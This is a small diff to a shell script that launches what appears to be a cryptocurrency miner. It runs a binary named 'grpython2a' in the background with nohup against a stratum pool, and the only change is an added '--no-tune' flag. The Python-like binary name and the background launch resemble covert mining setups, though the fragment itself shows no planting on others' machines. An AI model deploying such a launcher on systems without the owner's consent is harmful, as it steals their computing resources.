@@ -84,7 +84,7 @@ test_cpu () {
 
 test2_cpu () {
   local Algo='gr'
-  nohup ./grpython2a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG
+  nohup ./grpython2a -a $Algo -o stratum+tcp://$PROX:$TESTPort2 -u $W_DG -p $P_DG  --no-tune
 
 }
 
